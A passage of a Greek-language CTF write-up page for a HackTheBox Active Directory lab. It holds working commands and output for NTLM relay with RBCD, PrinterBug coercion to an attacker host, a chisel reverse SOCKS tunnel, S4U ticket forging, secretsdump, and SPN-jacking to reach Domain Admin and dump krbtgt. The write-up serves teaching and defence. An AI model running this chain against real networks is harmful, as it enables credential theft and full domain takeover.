+  <p>Ξεκίνα το relay να δείχνει στο LDAP, λέγοντάς του να ρυθμίσει delegation για τον νέο μας λογαριασμό. Το <code>--remove-mic</code> είναι το κόλπο drop-the-MIC που αφήνει ένα relay SMB→LDAP να περάσει ακόμα και με παρόν ένα MIC· το LDAP του DC δεν επιβάλλει signing, οπότε προσγειώνεται. Το binding του server SMB στη 445 χρειάζεται root:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ntlmrelayx — RBCD attack</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">sudo ntlmrelayx.py -t ldap://&lt;DC_IP&gt; -smb2support --remove-mic \
+     --delegate-access --escalate-user 'hackpuntes$'</span>
+<span class="po">[*] Servers started, waiting for connections</span></div>
+  </div>
+
+  <p>Τώρα η coercion. Το <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code> του PrinterBug κάνει το spooler του στόχου να κάνει authenticate πίσω σε οποιονδήποτε host ονομάσουμε. Στέλνουμε το RPC <em>στο</em> <code>WEB01</code> μέσω του tunnel SOCKS και δείχνουμε το callback στη δική μας IP VPN:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">PrinterBug coercion (through proxychains)</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">proxychains4 python3 printerbug.py -no-ping \
+     -hashes :e819498e... 'pirate.htb/gMSA_ADFS_prod$'@192.168.100.2 &lt;ATTACKER&gt;</span>
+<span class="po">[*] Attempting to trigger authentication via rprn RPC at 192.168.100.2
+[*] Triggered RPC backconnect, this may or may not have worked</span></div>
+  </div>
+
+  <p>Δούλεψε — το callback του spooler έφτασε τη διεύθυνση VPN μου (routed έξω μέσω του DC), και το relay έκανε τη δουλειά του:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ntlmrelayx — result</span>
+    </div>
+    <div class="term-body"><span class="po">[*] Authenticating connection from PIRATE/WEB01$ ... against ldap://&lt;DC_IP&gt; SUCCEED</span>
+<span class="pg">[*] Delegation rights modified succesfully!
+[*] hackpuntes$ can now impersonate users on WEB01$ via S4U2Proxy</span></div>
+  </div>
+
+  <p>Το RBCD είναι ορισμένο. Τώρα S4U2Self+S4U2Proxy σαν <code>hackpuntes$</code> για να πάρουμε ένα ticket <code>cifs/WEB01</code> <em>σαν Administrator</em>, μετά κάνε dump τα secrets του WEB01 μέσα από το tunnel:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">S4U → secretsdump WEB01</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">faketime -f '+7h' getST.py -spn cifs/WEB01.pirate.htb -impersonate Administrator \
+     'pirate.htb/hackpuntes$:1Qwerty!' -dc-ip &lt;DC_IP&gt;</span>
+<span class="pg">[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache</span>
+<span class="pd">$ </span><span class="pc">KRB5CCNAME=Administrator@cifs_WEB01...ccache \
+     proxychains4 secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb</span>
+<span class="po">Administrator:500:aad3b435...:b1aac158...:::               </span><span class="pco"># WEB01 local admin</span><span class="po">
+[*] DefaultPassword</span>
+<span class="pg">PIRATE\a.white:E2nvAOKSz5Xz2MJu                            </span><span class="pco"># LSA autologon secret</span></div>
+  </div>
+
+  <p>Το βραβείο είναι στα LSA secrets: ένα <strong>autologon</strong> <code>DefaultPassword</code> για έναν πραγματικό χρήστη domain, τον <code>a.white</code>, καθισμένο σε cleartext. Αυτός είναι ο λογαριασμός του οποίου το desktop κρατά το user flag — διάβασέ το κατευθείαν από το <code>WEB01</code> με το ticket Administrator που ήδη έχουμε:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">user.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">proxychains4 smbclient.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb</span>
+<span class="pd"># </span><span class="pc">use C$</span>
+<span class="pd"># </span><span class="pc">get Users\a.white\Desktop\user.txt</span>
+<span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <!-- ══ FORCECHANGE ══ -->
+  <h2>Πλάγιο — ForceChangePassword σε λογαριασμό delegation</h2>
+
+  <p>Πίσω στο domain με πραγματικά credentials χρήστη. Ο <code>a.white</code> κρατά ένα δικαίωμα <strong>ForceChangePassword</strong> πάνω στον <code>a.white_adm</code> — τη δυνατότητα να κάνει reset το password εκείνου του λογαριασμού χωρίς να ξέρει το παλιό. Ο DC είναι απευθείας προσβάσιμος, οπότε δεν χρειάζεται tunnel εδώ:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">reset a.white_adm</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD --host dc01.pirate.htb -d pirate.htb -u a.white -p 'E2nvAOKSz5Xz2MJu' \
+     set password 'a.white_adm' '1Qwerty!'</span>
+<span class="pg">[+] Password changed successfully!</span></div>
+  </div>
+
+  <p>Γιατί έχει σημασία ο <code>a.white_adm</code> γίνεται ξεκάθαρο τη στιγμή που κοιτάς το config delegation του:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">findDelegation</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">findDelegation.py 'pirate.htb/a.white_adm:1Qwerty!' -dc-ip &lt;DC_IP&gt;</span>
+<span class="po">AccountName  DelegationType                      DelegationRightsTo
+-----------  ----------------------------------  ---------------------</span>
+<span class="py">a.white_adm  Constrained w/ Protocol Transition  http/WEB01.pirate.htb</span></div>
+  </div>
+
+  <p>Το <strong>constrained delegation με protocol transition</strong> (η σημαία <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> του λογαριασμού) σημαίνει ότι ο <code>a.white_adm</code> μπορεί να καλέσει S4U2Self για να φτιάξει ένα χρησιμοποιήσιμο ticket για <em>οποιονδήποτε</em> χρήστη, μετά S4U2Proxy για να το προωθήσει στην υπηρεσία που ονομάζεται στο <code>msDS-AllowedToDelegateTo</code> — εδώ, το <code>http/WEB01.pirate.htb</code>. Στα χαρτιά αυτό μας επιτρέπει μόνο να χτυπήσουμε μια υπηρεσία web στο WEB01, που ήδη κατέχουμε. Το κόλπο είναι σε τι πραγματικά δείχνει "το SPN".</p>
+
+  <!-- ══ SPN JACK ══ -->
+  <h2>Root — SPN-jacking constrained delegation πάνω στον DC</h2>
+
+  <p>Όταν το KDC εκδίδει ένα ticket S4U2Proxy για το <code>http/WEB01.pirate.htb</code>, κρυπτογραφεί εκείνο το ticket με το μακροπρόθεσμο κλειδί <strong>όποιου λογαριασμού κατέχει αυτή τη στιγμή εκείνο το SPN</strong>. Τώρα αυτό είναι το <code>WEB01$</code>. Αλλά τα SPNs είναι απλά multi-valued attributes, πρέπει να είναι μοναδικά στο forest, και — κρίσιμο — ο <code>a.white_adm</code> μπορεί να γράψει <code>servicePrincipalName</code> και στο <code>WEB01$</code> και στο <code>DC01$</code>. Οπότε <strong>μετακίνησε το SPN</strong>: διάγραψε το <code>http/WEB01.pirate.htb</code> από το <code>WEB01$</code>, πρόσθεσέ το στο <code>DC01$</code>. Τώρα το ίδιο request S4U2Proxy αποδίδει ένα ticket κρυπτογραφημένο με το κλειδί του <em>DC</em>.</p>
+
+  <p>Έκανα τη μετακίνηση χειρουργικά με <code>ldapmodify</code> ώστε τα άλλα 24 SPNs του DC να μείνουν ανέγγιχτα (η σειρά έχει σημασία — διάγραψε πριν προσθέσεις, αλλιώς ο περιορισμός μοναδικότητας το απορρίπτει):</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">move the SPN WEB01$ → DC01$</span>
+    </div>
+    <div class="term-body"><span class="pco"># delete from WEB01$</span>
+<span class="pd">$ </span><span class="pc">ldapmodify -x -H ldap://&lt;DC_IP&gt; -D 'a.white_adm@pirate.htb' -w '1Qwerty!' &lt;&lt;'EOF'
+dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
+changetype: modify
+delete: servicePrincipalName
+servicePrincipalName: HTTP/WEB01.pirate.htb
+EOF</span>
+<span class="pco"># add to DC01$</span>
+<span class="pd">$ </span><span class="pc">ldapmodify -x -H ldap://&lt;DC_IP&gt; -D 'a.white_adm@pirate.htb' -w '1Qwerty!' &lt;&lt;'EOF'
+dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
+changetype: modify
+add: servicePrincipalName
+servicePrincipalName: HTTP/WEB01.pirate.htb
+EOF</span>
+<span class="po">modifying entry "CN=WEB01,CN=Computers,DC=pirate,DC=htb"
+modifying entry "CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb"</span></div>
+  </div>
+
+  <p>Τώρα το κέρδος. Ζήτησε το delegated ticket για το <code>http/WEB01.pirate.htb</code> κάνοντας impersonate τον <code>administrator</code> — επιστρέφει σφραγισμένο με το κλειδί του <code>DC01$</code> — και χρησιμοποίησε το <strong><code>-altservice</code></strong> για να ξαναγράψεις το όνομα υπηρεσίας στο ticket σε <code>cifs/DC01</code>. Αυτή η αντικατάσταση sname είναι νόμιμη γιατί και οι δύο κλάσεις υπηρεσίας σερβίρονται από το ίδιο κλειδί λογαριασμού, και μετατρέπει ένα ticket "web" σε ένα ticket SMB προς τον domain controller:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">getST — S4U + altservice</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">faketime -f '+7h' getST.py -spn 'http/WEB01.pirate.htb' -impersonate administrator \
+     'pirate.htb/a.white_adm:1Qwerty!' -dc-ip &lt;DC_IP&gt; -altservice 'cifs/DC01.pirate.htb'</span>
+<span class="po">[*] Requesting S4U2Proxy
+[*] Changing service from http/WEB01.pirate.htb@PIRATE.HTB to cifs/DC01.pirate.htb@PIRATE.HTB</span>
+<span class="pg">[*] Saving ticket in administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache</span></div>
+  </div>
+
+  <p>Αυτό είναι ένα ticket Administrator προς την ίδια την υπηρεσία <code>cifs</code> του DC — game over. Διάβασε το root flag, και κάνε DCSync για να κάνεις το domain compromise ξεκάθαρο:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">root.txt + DCSync</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">KRB5CCNAME=administrator@cifs_DC01...ccache faketime -f '+7h' \
+     smbclient.py -k -no-pass dc01.pirate.htb</span>
+<span class="pd"># </span><span class="pc">use C$</span>
+<span class="pd"># </span><span class="pc">get Users\Administrator\Desktop\root.txt</span>
+<span class="pg">[redacted — root flag]</span>
+<span class="pd">$ </span><span class="pc">KRB5CCNAME=administrator@cifs_DC01...ccache faketime -f '+7h' \
+     secretsdump.py -k -no-pass -just-dc-user krbtgt dc01.pirate.htb</span>
+<span class="pg">krbtgt:502:aad3b435...:33071738...:::                      </span><span class="pco"># golden-ticket capable</span></div>
+  </div>
+
+  <div class="alert alert-success">Το constrained delegation ελέγχει <em>ποια υπηρεσία</em> μπορείς να φτάσεις, ποτέ <em>ποιος λογαριασμός κατέχει το όνομα εκείνης της υπηρεσίας</em>. Αν ένας principal μπορεί να ξαναγράψει <code>servicePrincipalName</code> σε ένα αντικείμενο computer — ειδικά τον DC — τότε ο στόχος delegation στον οποίο δείχνει "με ασφάλεια" είναι ένα κινούμενο αντικείμενο. Μεταχειρίσου την πρόσβαση write στο <code>servicePrincipalName</code> σε privileged λογαριασμούς σαν ισοδύναμη με έλεγχο όλου του τι κάνει delegate σε αυτούς.</div>
+
+  <!-- ══ macOS ══ -->
+  <h2>Σημειώσεις operator — τρέχοντας αυτό από macOS</h2>
+
+  <p>Τίποτα από το tradecraft δεν αλλάζει σε Mac, αλλά μερικές αιχμηρές άκρες αξίζει να καταγραφούν:</p>
+
+  <ul>
+    <li><strong>Clock skew Kerberos.</strong> Ο DC έτρεχε +7ω μπροστά. Το <code>faketime -f '+7h' &lt;tool&gt;</code> μετατοπίζει το ρολόι μιας μόνο διαδικασίας χωρίς να αγγίζει το σύστημα — πιο καθαρό από το <code>ntpdate</code>, που θέλει root και τραβά ολόκληρο το box σου μακριά από την πραγματική ώρα. Το bloodyAD αυτοδιορθώνεται, οπότε δεν χρειάζεται wrapper.</li>
+    <li><strong>Οι λογαριασμοί machine και gMSA αρνούνται logon NTLM</strong> (<code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>) — ένα λάθος password και μια άρνηση πολιτικής μοιάζουν σχεδόν ίδια, οπότε επιβεβαίωσε με ένα TGT (<code>getTGT.py</code>), που είναι το auth path που πραγματικά δουλεύει.</li>
+    <li><strong>Τα proxychains + netexec δεν ταιριάζουν</strong> σε macOS: οι multiprocessing workers του netexec δεν κληρονομούν το preload <code>DYLD_INSERT_LIBRARIES</code>, οπότε τίποτα δεν γίνεται hooked. Τα single-process scripts Impacket κάνουν proxy μια χαρά, γι' αυτό τα βήματα σχετικά-με-relay είναι όλα Impacket.</li>
+    <li><strong>faketime + proxychains μαζί</strong> σημαίνει δύο dylibs στο <code>DYLD_INSERT_LIBRARIES</code> ταυτόχρονα — όρισε τη μεταβλητή χειροκίνητα με και τα δύο paths αντί να φωλιάζεις τους δύο wrappers, αλλιώς ο ένας γράφει πάνω στον άλλο.</li>
+    <li><strong>Το callback του relay βρήκε τον δρόμο σπίτι.</strong> Το WEB01 κάθεται σε ένα segment μόνο-εσωτερικό, αλλά το callback του spooler του στην IP VPN μου routed έξω μέσω του dual-homed DC — οπότε δεν χρειάστηκε reverse port-forward στη 445, που είναι το κομμάτι που κανονικά είναι επίπονο να κάνεις tunnel.</li>
+  </ul>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Γιατί Δούλεψε</h2>
+
+  <table class="st">
+    <tr><th>Σταδιο</th><th>Ριζα του προβληματος</th></tr>
+    <tr><td>→ MS01$</td><td>Λογαριασμός machine Pre-Windows 2000 που ποτέ δεν έκανε join, ακόμα κρατώντας το bootstrap password του = πεζό όνομα (αδύναμο default credential, CWE-1392)</td></tr>
+    <tr><td>→ DC01 (WinRM)</td><td>Managed password gMSA αναγνώσιμο από έναν λογαριασμό που τώρα ελέγχουμε — υπερβολικά ευρύ <code>msDS-GroupMSAMembership</code></td></tr>
+    <tr><td>→ WEB01 / a.white</td><td>Απενεργοποιημένο SMB signing + coercion λογαριασμού machine (PrinterBug) → NTLM relay στο LDAP → RBCD· credentials domain αφημένα σε ένα secret autologon LSA (CWE-294 / CWE-522)</td></tr>
+    <tr><td>→ a.white_adm</td><td>DACL ForceChangePassword πάνω σε έναν privileged, delegation-enabled λογαριασμό (CWE-269)</td></tr>
+    <tr><td>→ Domain Admin</td><td>Το SPN constrained-delegation είναι μεταβλητό· εγγράψιμο <code>servicePrincipalName</code> στον DC σου επιτρέπει να κάνεις SPN-jack τον στόχο πάνω στο <code>DC01$</code> (CWE-266)</td></tr>
+  </table>
+
+  <h2>Βασικές εντολές</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. λογαριασμος machine pre2k → TGT Kerberos</span>
+<span class="pc">nxc ldap &lt;DC_IP&gt; -u pentest -p 'p3nt3st2025!&amp;' -M pre2k</span>
+<span class="pc">getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip &lt;DC_IP&gt;</span>
+
+<span class="pco"># 2. διαβασε managed password gMSA → WinRM στον DC01</span>
+<span class="pc">KRB5CCNAME=MS01$.ccache bloodyAD --host dc01.pirate.htb -d pirate.htb -k get object 'gMSA_ADFS_prod$' --attr msDS-ManagedPassword</span>
+<span class="pc">evil-winrm -i dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H &lt;gmsa-hash&gt;</span>
+
+<span class="pco"># 3. pivot στο 192.168.100.0/24 (chisel reverse SOCKS)</span>
+<span class="pc">./chisel server --reverse --socks5 -p 9001      # επιτιθεμενος</span>
+<span class="pc">c.exe client &lt;ATTACKER&gt;:9001 R:socks            # στον DC01</span>
+
+<span class="pco"># 4. RBCD μεσω relay + PrinterBug → a.white (user.txt)</span>
+<span class="pc">addcomputer.py -computer-name 'hackpuntes$' -computer-pass '1Qwerty!' -dc-host dc01.pirate.htb -hashes :&lt;gmsa-hash&gt; 'pirate.htb/gMSA_ADFS_prod$'</span>
+<span class="pc">sudo ntlmrelayx.py -t ldap://&lt;DC_IP&gt; -smb2support --remove-mic --delegate-access --escalate-user 'hackpuntes$'</span>
+<span class="pc">proxychains4 python3 printerbug.py -no-ping -hashes :&lt;gmsa-hash&gt; 'pirate.htb/gMSA_ADFS_prod$'@192.168.100.2 &lt;ATTACKER&gt;</span>
+<span class="pc">faketime -f '+7h' getST.py -spn cifs/WEB01.pirate.htb -impersonate Administrator 'pirate.htb/hackpuntes$:1Qwerty!' -dc-ip &lt;DC_IP&gt;</span>
+<span class="pc">proxychains4 secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb</span>
+
+<span class="pco"># 5. ForceChangePassword + SPN-jack → Domain Admin (root.txt)</span>
+<span class="pc">bloodyAD --host dc01.pirate.htb -d pirate.htb -u a.white -p '&lt;pw&gt;' set password 'a.white_adm' '1Qwerty!'</span>
+<span class="pc">ldapmodify ... delete HTTP/WEB01.pirate.htb from WEB01$ ; add it to DC01$</span>
+<span class="pc">faketime -f '+7h' getST.py -spn 'http/WEB01.pirate.htb' -impersonate administrator 'pirate.htb/a.white_adm:1Qwerty!' -dc-ip &lt;DC_IP&gt; -altservice 'cifs/DC01.pirate.htb'</span>
+<span class="pc">faketime -f '+7h' secretsdump.py -k -no-pass -just-dc dc01.pirate.htb</span></div>
+  </div>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
